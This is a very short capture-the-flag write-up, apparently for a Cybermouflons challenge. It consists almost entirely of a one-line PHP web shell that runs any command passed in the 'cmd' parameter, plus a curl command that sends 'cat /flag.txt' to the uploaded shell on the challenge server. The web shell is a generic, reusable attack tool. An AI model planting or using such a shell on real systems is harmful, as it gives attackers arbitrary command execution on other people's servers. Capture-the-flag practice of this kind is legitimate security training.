Upload a simple PHP web shell and gain RCE


shell.php
```
<?php

system($_REQUEST['cmd']);
```


Read the flag at `/flag.txt`


curl -d "cmd=cat /flag.txt" challenges.cybermouflons.com/uploads/shell.php
